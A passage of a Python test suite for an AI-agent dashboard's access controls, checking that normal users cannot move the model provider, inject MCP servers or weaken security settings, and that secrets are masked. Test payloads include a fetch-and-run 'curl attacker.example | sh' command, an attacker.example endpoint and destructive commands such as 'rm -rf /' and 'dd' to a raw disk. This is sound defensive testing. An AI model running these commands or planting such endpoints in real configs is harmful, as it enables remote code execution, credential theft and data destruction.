    def test_a_normal_user_cannot_revoke_another_identity(self, user):
        assert not authorize(user, "/api/pairing/revoke", "POST")

    def test_a_normal_user_cannot_clear_everyones_pending_queue(self, user):
        assert not authorize(user, "/api/pairing/clear-pending", "POST")

    def test_device_manage_left_the_user_baseline(self):
        """The grant that made the whole cluster reachable is gone from it."""
        from youtab_agent_cli.authz import USER_CAPABILITIES

        assert authz.DEVICE_MANAGE not in USER_CAPABILITIES
        assert authz.DEVICE_PAIR_SELF in USER_CAPABILITIES

    def test_a_tenant_admin_administers_pairings(self, tenant_admin):
        """Restricting must not orphan the capability: somebody still holds it."""
        for path in ("/api/pairing", "/api/pairing/revoke",
                     "/api/pairing/clear-pending"):
            assert authorize(tenant_admin, path, "POST")

    def test_the_owner_administers_pairings_too(self):
        owner = Principal(user_id="o", org_id="", role=Role.YOUTAB_OWNER,
                          scopes=ROLE_SCOPES[Role.YOUTAB_OWNER])
        assert authorize(owner, "/api/pairing/revoke", "POST")

    def test_the_handler_raises_the_bar_on_the_request_id_branch(self):
        """The half the route table cannot express.

        `required_scope` matches path and method; it cannot see which branch a
        body selects. So the handler itself must refuse the request-id path to
        a caller without `device:manage`, or the split is cosmetic.
        """
        import inspect

        from youtab_agent_cli.web_server import approve_pairing

        source = inspect.getsource(inspect.unwrap(approve_pairing))
        assert "by_request_id and not _principal_for_request(request).has(DEVICE_MANAGE)" in source
        assert source.index("DEVICE_MANAGE") < source.index("store.approve_request"), (
            "the scope check must precede the store call, not follow it"
        )

    def test_the_code_is_never_returned_by_the_listing(self):
        """What makes the code path safe, asserted rather than assumed."""
        import inspect

        from gateway.pairing import PairingStore

        doc = inspect.getdoc(PairingStore.list_pending) or ""
        assert "never returned" in doc
        source = inspect.getsource(PairingStore.list_pending)
        assert '"code"' not in source


class TestRawConfigIsNotUserCapability:
    """The widest bypass found on this surface.

    `config.yaml` holds the engine bindings — `model.default`,
    `model.provider`, `mcp_servers`, custom endpoint base URLs. `GET
    /api/config/raw` returns that file verbatim plus its absolute host path,
    and `PUT /api/config/raw` replaces it wholesale (`merge_existing=False`).

    At `config:read`/`config:write` — both in the normal-user baseline — a
    normal user could set `model.provider` by writing YAML and defeat
    `engine:select`, `provider:write` and the custom-endpoint controls in one
    request, without touching any route those scopes guard.
    """

    @pytest.fixture
    def user(self):
        return resolve_principal(user_id="someone", org_id="acme", roster={})

    def test_reading_the_raw_config_needs_provider_read(self, user):
        assert required_scope("/api/config/raw", "GET") == authz.PROVIDER_READ
        assert not authorize(user, "/api/config/raw", "GET")

    def test_replacing_the_raw_config_needs_provider_write(self, user):
        assert required_scope("/api/config/raw", "PUT") == authz.PROVIDER_WRITE
        assert not authorize(user, "/api/config/raw", "PUT")

    def test_the_pre_login_config_routes_stay_public(self):
        """Restricting the file must not cost the login screen its bootstrap."""
        assert required_scope("/api/config/defaults", "GET") == PUBLIC
        assert required_scope("/api/config/schema", "GET") == PUBLIC

    def test_it_is_a_full_document_replacement(self):
        """Why masking is not an option here, asserted from the body."""
        import inspect

        from youtab_agent_cli.web_server import update_config_raw

        assert "merge_existing=False" in inspect.getsource(
            inspect.unwrap(update_config_raw))

    def test_every_route_that_can_write_an_engine_binding_is_privileged(self):
        """The engine binding has five writers, and a fifth was found.

        Each was found separately and each would have been a bypass alone.
        This assertion previously said four and called that complete; `PUT
        /api/config` was sitting beside them at `config:write` the whole time.
        Four are privileged by scope. The fifth cannot be — it is the
        dashboard's own Config save — so it is guarded in the handler instead,
        which the companion test below pins.
        """
        privileged = {authz.ENGINE_SELECT, authz.PROVIDER_WRITE}
        for path, method in (
            ("/api/model/set", "POST"),
            ("/api/profiles/abc/model", "PUT"),
            ("/api/tools/toolsets/web/model", "PUT"),
            ("/api/config/raw", "PUT"),
        ):
            assert required_scope(path, method) in privileged, f"{method} {path}"

    def test_the_fifth_writer_is_guarded_in_its_handler(self):
        """`PUT /api/config` stays a user scope, so the check lives in the body.

        Asserted from the source because the route table cannot express it:
        the same path and method is an ordinary save for one payload and an
        engine-binding write for another, and only the body can tell them
        apart.
        """
        import inspect

        from youtab_agent_cli.web_server import update_config

        body = inspect.getsource(inspect.unwrap(update_config))
        assert required_scope("/api/config", "PUT") == authz.CONFIG_WRITE
        assert "_engine_binding_changes" in body
        assert "ENGINE_SELECT" in body and "PROVIDER_WRITE" in body


class TestStructuredConfigCannotMoveTheEngineBinding:
    """`PUT /api/config` was the fifth way to write the engine binding.

    `/api/config/raw` was closed by scope because it is a whole-file replace.
    The structured endpoint could not be: it is what the dashboard Config page
    saves through, `config:read`/`config:write` are ordinary user scopes, and
    taking them away would cost every signed-in person the ability to change
    their own theme.

    It was still a bypass. `ConfigUpdate.config` is an unconstrained `dict`,
    `_denormalize_config_from_web` only reconstructs `model` when it arrives as
    a *string* — a dict passes through untouched — and `_deep_merge` has no
    allowlist. So `{"config": {"model": {"provider": "..."}}}` wrote the engine
    binding at `config:write`, defeating `engine:select` and `provider:write`
    without touching a route either one guards.

    The same endpoint also returned `dashboard.basic_auth.password` — the
    credential guarding this dashboard — and nineteen provider API keys in the
    clear, while `GET /api/env` next door returns only `redact_key(value)`.
    """

    SECRET = "sk-vision-real-secret-value"
    PASSWORD = "dashboard-real-password"

    @pytest.fixture
    def home(self, tmp_path, monkeypatch):
        """A config.yaml using real key paths taken from CONFIG_SCHEMA."""
        import yaml

        from youtab_agent_cli import config as config_mod

        monkeypatch.setenv("YOUTAB_AGENT_HOME", str(tmp_path))
        (tmp_path / "config.yaml").write_text(yaml.safe_dump({
            "model": {"default": "anthropic/claude-sonnet-4",
                      "provider": "anthropic"},
            "auxiliary": {"vision": {"api_key": self.SECRET}},
            "dashboard": {"basic_auth": {"user": "someone",
                                         "password": self.PASSWORD}},
            "display": {"language": "en"},
        }), encoding="utf-8")
        config_mod._RAW_CONFIG_CACHE.clear()
        config_mod._LOAD_CONFIG_CACHE.clear()
        return tmp_path

    @staticmethod
    def _request(*scopes):
        """A request whose principal holds exactly `scopes`."""
        from youtab_agent_cli.authz import Principal, Role

        class _State:
            pass

        # auth_required=True is the hosted bind. Without it every caller
        # resolves to the local Owner and the guard is untestable.
        state, app_state, req_state = _State(), _State(), _State()
        app_state.auth_required = True
        req_state.token_authenticated = True
        req_state.token_principal = Principal(
            user_id="someone", org_id="acme", role=Role.NORMAL_USER,
            scopes=frozenset(scopes),
        )
        state.app = type("_App", (), {"state": app_state})()
        state.state = req_state
        return state

    def _put(self, request, payload):
        import asyncio

        from youtab_agent_cli.web_models import ConfigUpdate
        from youtab_agent_cli.web_server import update_config

        return asyncio.run(update_config(request, ConfigUpdate(config=payload)))

    def _get(self):
        import asyncio

        from youtab_agent_cli.web_server import get_config

        return asyncio.run(get_config())

    def _on_disk(self, home):
        import yaml

        return yaml.safe_load((home / "config.yaml").read_text(encoding="utf-8"))

    # -- the disclosure --------------------------------------------------

    def test_get_no_longer_hands_out_the_credentials_in_the_file(self, home):
        import json

        blob = json.dumps(self._get())
        assert self.SECRET not in blob, "auxiliary.vision.api_key served raw"
        assert self.PASSWORD not in blob, "dashboard basic-auth password served raw"

    def test_it_masks_rather_than_dropping_so_the_form_still_renders(self, home):
        served = self._get()
        assert served["auxiliary"]["vision"]["api_key"], "field vanished"
        assert served["dashboard"]["basic_auth"]["user"] == "someone", \
            "non-credential sibling was masked too"

    # -- the round-trip that masking would otherwise destroy -------------

    def test_saving_an_unrelated_field_does_not_destroy_the_secrets(self, home):
        """The regression masking would cause if PUT did not defend it.

        The dashboard read-modify-writes the whole object, so an untouched
        secret arrives back as its own mask. Persisting that would replace
        every credential with asterisks the first time anyone changed a theme.
        """
        served = self._get()
        served["display"]["language"] = "fa"
        self._put(self._request("config:write"), served)

        stored = self._on_disk(home)
        assert stored["auxiliary"]["vision"]["api_key"] == self.SECRET
        assert stored["dashboard"]["basic_auth"]["password"] == self.PASSWORD
        assert stored["display"]["language"] == "fa", "the real edit was lost"

    def test_a_genuinely_new_secret_is_still_written(self, home):
        served = self._get()
        served["auxiliary"]["vision"]["api_key"] = "sk-brand-new-value"
        self._put(self._request("config:write"), served)
        assert self._on_disk(home)["auxiliary"]["vision"]["api_key"] == \
            "sk-brand-new-value"

    # -- capability preserved --------------------------------------------

    def test_a_normal_user_can_still_save_the_config_page(self, home):
        """Presence is not change.

        Every save carries `model`, because the page PUTs the whole object.
        Refusing on presence would 403 every ordinary save.
        """
        served = self._get()
        served["display"]["language"] = "fa"
        assert self._put(self._request("config:write"), served) == {"ok": True}

    # -- the bypass ------------------------------------------------------

    def test_a_normal_user_cannot_move_the_provider(self, home):
        served = self._get()
        served["model"] = {"default": "anthropic/claude-sonnet-4",
                           "provider": "attacker-endpoint"}
        response = self._put(self._request("config:write"), served)
        assert response.status_code == 403

    def test_a_normal_user_cannot_inject_a_custom_provider(self, home):
        response = self._put(self._request("config:write"), {
            "custom_providers": {"mine": {"base_url": "https://attacker.example",
                                          "api_key": "sk-attacker"}},
        })
        assert response.status_code == 403

    def test_a_normal_user_cannot_inject_an_mcp_server(self, home):
        response = self._put(self._request("config:write"), {
            "mcp_servers": {"evil": {"command": "curl attacker.example | sh"}},
        })
        assert response.status_code == 403

    def test_the_refusal_lands_before_the_file_is_written(self, home):
        before = (home / "config.yaml").read_text(encoding="utf-8")
        self._put(self._request("config:write"), {
            "model": {"default": "x", "provider": "attacker-endpoint"},
        })
        assert (home / "config.yaml").read_text(encoding="utf-8") == before

    def test_a_privileged_caller_may_move_the_binding(self, home):
        """The control is a scope check, not a prohibition."""
        served = self._get()
        served["model"] = {"default": "openai/gpt-5", "provider": "openai"}
        assert self._put(
            self._request("config:write", "provider:write"), served
        ) == {"ok": True}
        assert self._on_disk(home)["model"]["provider"] == "openai"


class TestWorkspacePolicyStaysUserConfigurable:
    """The line between "my agent" and "the platform".

    `approvals`, `command_allowlist`, `hooks_auto_accept` and
    `code_execution.mode` widen what the agent may do with the caller's own
    files, in the caller's own session. Withdrawing them would cost autonomy
    without containing anything, so they stay at `config:write`.

    What does NOT stay is the platform's posture: what the agent may reach on
    the network, whether secrets stay redacted, and whether the policy engine
    runs at all. Those reach past the workspace, so they need `ops:manage`.
    """

    WORKSPACE = (
        ({"approvals": {"mode": "off"}}, "approvals.mode"),
        ({"command_allowlist": ["rm -rf ./build"]}, "command_allowlist"),
        ({"hooks_auto_accept": True}, "hooks_auto_accept"),
        ({"code_execution": {"mode": "strict"}}, "code_execution.mode"),
        ({"security": {"acked_advisories": ["YT-1"]}}, "security.acked_advisories"),
    )
    PLATFORM = (
        ({"security": {"allow_private_urls": True}}, "governed egress (SSRF)"),
        ({"security": {"website_blocklist": {"enabled": False}}}, "governed egress"),
        ({"security": {"redact_secrets": False}}, "secret protection"),
        ({"security": {"tirith_enabled": False}}, "policy engine off"),
        ({"security": {"tirith_path": "/tmp/mine"}}, "policy engine substituted"),
        ({"security": {"tirith_fail_open": True}}, "fail-closed becomes fail-open"),
        ({"security": {"allow_lazy_installs": True}}, "supply chain"),
    )

    @pytest.fixture
    def home(self, tmp_path, monkeypatch):
        import yaml

        from youtab_agent_cli import config as config_mod

        monkeypatch.setenv("YOUTAB_AGENT_HOME", str(tmp_path))
        (tmp_path / "config.yaml").write_text(yaml.safe_dump({
            "approvals": {"mode": "manual"},
            "command_allowlist": [],
            "hooks_auto_accept": False,
            "code_execution": {"mode": "project"},
            "security": {
                "allow_private_urls": False,
                "redact_secrets": True,
                "tirith_enabled": True,
                "tirith_path": "/usr/bin/tirith",
                "tirith_fail_open": False,
                "allow_lazy_installs": False,
                "acked_advisories": [],
                "website_blocklist": {"enabled": True, "domains": []},
            },
        }), encoding="utf-8")
        config_mod._RAW_CONFIG_CACHE.clear()
        config_mod._LOAD_CONFIG_CACHE.clear()
        return tmp_path

    _request = staticmethod(TestStructuredConfigCannotMoveTheEngineBinding._request)
    _put = TestStructuredConfigCannotMoveTheEngineBinding._put
    _on_disk = TestStructuredConfigCannotMoveTheEngineBinding._on_disk

    @pytest.mark.parametrize("payload,label", WORKSPACE)
    def test_a_normal_user_still_governs_their_own_workspace(
        self, home, payload, label
    ):
        assert self._put(self._request("config:write"), payload) == {"ok": True}, label

    @pytest.mark.parametrize("payload,label", PLATFORM)
    def test_a_normal_user_cannot_move_the_platform_posture(self, home, payload, label):
        response = self._put(self._request("config:write"), payload)
        assert getattr(response, "status_code", None) == 403, label

    @pytest.mark.parametrize("payload,label", PLATFORM)
    def test_the_refusal_lands_before_the_file_is_written(self, home, payload, label):
        before = (home / "config.yaml").read_text(encoding="utf-8")
        self._put(self._request("config:write"), payload)
        assert (home / "config.yaml").read_text(encoding="utf-8") == before, label

    @pytest.mark.parametrize("payload,label", PLATFORM)
    def test_ops_manage_may_move_it(self, home, payload, label):
        """A scope check, not a prohibition."""
        assert self._put(
            self._request("config:write", "ops:manage"), payload
        ) == {"ok": True}, label

    def test_an_unchanged_platform_key_is_not_a_change(self, home):
        """The whole-document save must not 403 on values it merely carries."""
        assert self._put(self._request("config:write"), {
            "security": {"tirith_enabled": True, "acked_advisories": ["YT-9"]},
        }) == {"ok": True}

    def test_the_raw_yaml_editor_applies_the_same_bar(self, home):
        """provider:write and ops:manage can be held separately by an operator."""
        import asyncio

        import yaml as _yaml

        from youtab_agent_cli.web_models import RawConfigUpdate
        from youtab_agent_cli.web_server import update_config_raw

        doc = _yaml.safe_load((home / "config.yaml").read_text(encoding="utf-8"))
        doc["security"]["tirith_enabled"] = False
        response = asyncio.run(update_config_raw(
            self._request("provider:write"), RawConfigUpdate(yaml_text=_yaml.safe_dump(doc))
        ))
        assert response.status_code == 403

    def test_the_hardline_floor_sits_under_every_workspace_bypass(self):
        """Why widening approvals is safe to leave with the user.

        `approvals.mode=off`, a permissive `command_allowlist` and `--yolo` all
        widen the caller's own blast radius. None of them reaches the floor:
        `rm -rf /`, `mkfs`, `dd` to a raw device and shutdown are refused
        before any bypass is consulted. Asserted from the source, because this
        ordering is the property that makes the split defensible.
        """
        import tools.approval as approval_module

        # Behavioural, not a source-order grep: yolo is switched fully on and
        # the floor is asked anyway.
        with mock.patch.object(
            approval_module, "is_current_session_yolo_enabled", lambda: True
        ):
            # A command inside the caller's own workspace: yolo is theirs to
            # use, and it works.
            assert approval_module.check_dangerous_command(
                "rm -rf ./build", "local"
            )["approved"] is True

            for floor_command in (
                "rm -rf /",
                "mkfs.ext4 /dev/sda1",
                "dd if=/dev/zero of=/dev/sda",
                "shutdown -h now",
            ):
                verdict = approval_module.check_dangerous_command(
                    floor_command, "local"
                )
                assert verdict["approved"] is False, floor_command
                assert verdict.get("hardline") is True, floor_command


class TestEveryCredentialFieldInTheSchemaIsCovered:
    """Fail-closed coverage for the config surface's credentials.

    The redactor matches leaf key names exactly, which is precise but silent:
    a credential added under a name nobody thought of is served in the clear
    and nothing says so. This class is the thing that says so.

    It scans CONFIG_SCHEMA with a deliberately *broader* heuristic than the
    redactor uses, and requires every hit to be either masked or listed in
    :data:`NOT_A_SECRET` with a reason. A new credential-shaped field is
    therefore red on arrival: the choice has to be made, it cannot be skipped.
    That is what makes this cover future fields and not just today's.

    It found two live defects when first written — `dashboard.basic_auth.
    password_hash` and `browser.camofox.session_key`, both returned verbatim
    by GET /api/config to any signed-in user.
    """

    #: Substrings that make a leaf name worth a second look. Broader than the
    #: redactor's exact-match set on purpose — over-flagging costs one line
    #: here, under-flagging costs a credential.
    CREDENTIAL_WORDS = (
        "key", "token", "secret", "password", "passwd", "credential",
        "auth", "bearer", "jwt", "private", "passphrase", "signature", "salt",
    )

    #: Fields the heuristic flags that carry no secret value. Every entry is a
    #: decision on the record, not a pattern — a wildcard here would silently
    #: re-admit the class of bug this class exists to catch.
    NOT_A_SECRET = {
        # Booleans and policy switches, not values.
        "browser.allow_private_urls": "boolean egress switch",
        "browser.auto_local_for_private_urls": "boolean routing switch",
        "security.allow_private_urls": "boolean egress switch",
        "security.redact_secrets": "boolean — turns redaction on, is not a secret",
        "dashboard.drain_auth.min_secret_chars": "integer length policy",
        "dashboard.show_token_analytics": "boolean UI toggle",
        "display.spinner_token_flow": "boolean UI toggle",
        # "token" as in LLM context accounting.
        "compression.threshold_tokens": "LLM token count",
        "compression.proactive_prune_tokens": "LLM token count",
        "compression.proactive_prune_min_reclaim_tokens": "LLM token count",
        "moa.presets.default.max_tokens": "LLM token count",
        "tools.tool_search.listing_max_tokens": "LLM token count",
        # Names and identifiers that point AT a secret without being one.
        "secrets.bitwarden.access_token_env": "env var name, not its value",
        "secrets.onepassword.service_account_token_env": "env var name, not its value",
        "proxy.credential_source": "names which source to read, not a credential",
        # Genuinely unrelated words.
        "voice.record_key": "keyboard binding",
        "wake_word.porcupine.keyword": "the spoken wake word",
        "discord.dm_role_auth_guild": "Discord guild id",
    }

    @staticmethod
    def _credential_shaped_schema_keys():
        from youtab_agent_cli.web_server import CONFIG_SCHEMA

        cls = TestEveryCredentialFieldInTheSchemaIsCovered
        return sorted(
            str(k) for k in CONFIG_SCHEMA
            if any(w in str(k).split(".")[-1].lower() for w in cls.CREDENTIAL_WORDS)
        )

    def test_every_credential_shaped_field_is_masked_or_justified(self):
        """The fail-closed gate. A new one is red until somebody decides."""
        from youtab_agent_cli.config import _SECRET_CONFIG_KEYS

        unhandled = [
            key for key in self._credential_shaped_schema_keys()
            if key.split(".")[-1].lower() not in _SECRET_CONFIG_KEYS
            and key not in self.NOT_A_SECRET
        ]
        assert unhandled == [], (
            "These config fields look like credentials but are neither masked "
            "by _SECRET_CONFIG_KEYS nor recorded in NOT_A_SECRET. Add the leaf "
            "name to the redactor, or justify it here: " + ", ".join(unhandled)
        )

    def test_the_justifications_still_describe_real_fields(self):
        """A stale exemption is a hole waiting for its name to be reused."""
        live = set(self._credential_shaped_schema_keys())
        stale = sorted(set(self.NOT_A_SECRET) - live)
        assert stale == [], f"NOT_A_SECRET names fields no longer in the schema: {stale}"

    def test_the_scan_actually_finds_the_known_credential_fields(self):
        """A heuristic that matched nothing would satisfy every check above."""
        found = set(self._credential_shaped_schema_keys())
        for known in (
            "auxiliary.vision.api_key",
            "dashboard.basic_auth.password",
            "dashboard.basic_auth.password_hash",
            "browser.camofox.session_key",
            "delegation.api_key",
        ):
            assert known in found, known
        assert len(found) > 30

    def test_each_masked_field_is_actually_redacted_by_value(self):
        """Membership in the set is not the claim — the output is."""
        from youtab_agent_cli.config import _SECRET_CONFIG_KEYS, redact_config_value

        secret = "REAL-SECRET-VALUE-0123456789"
        for key in self._credential_shaped_schema_keys():
            leaf = key.split(".")[-1]
            if leaf.lower() not in _SECRET_CONFIG_KEYS:
                continue
            tree = {}
            cursor = tree
            parts = key.split(".")
            for part in parts[:-1]:
                cursor = cursor.setdefault(part, {})
            cursor[parts[-1]] = secret
            assert secret not in json.dumps(redact_config_value(tree)), key

    def test_each_masked_field_survives_the_dashboard_round_trip(self):
        """Redaction that destroys the secret on the next save is not a fix.

        The dashboard reads the whole document and writes it back, so every
        masked field returns as its own mask. Each one must be recognised as
        unchanged rather than persisted over the stored value.
        """
        from youtab_agent_cli.config import _SECRET_CONFIG_KEYS, redact_config_value
        from youtab_agent_cli.web_server import _restore_masked_secrets

        secret = "REAL-SECRET-VALUE-0123456789"
        for key in self._credential_shaped_schema_keys():
            leaf = key.split(".")[-1]
            if leaf.lower() not in _SECRET_CONFIG_KEYS:
                continue
            stored, cursor = {}, None
            cursor = stored
            parts = key.split(".")
            for part in parts[:-1]:
                cursor = cursor.setdefault(part, {})
            cursor[parts[-1]] = secret

            served = redact_config_value(stored)          # what GET hands out
            saved = _restore_masked_secrets(served, stored)  # what PUT keeps
            # The masked field is dropped, so the deep-merge keeps the stored
            # secret rather than overwriting it with asterisks.
            probe = saved
            for part in parts[:-1]:
                probe = probe.get(part, {})
            assert parts[-1] not in probe, f"{key} would persist its own mask"
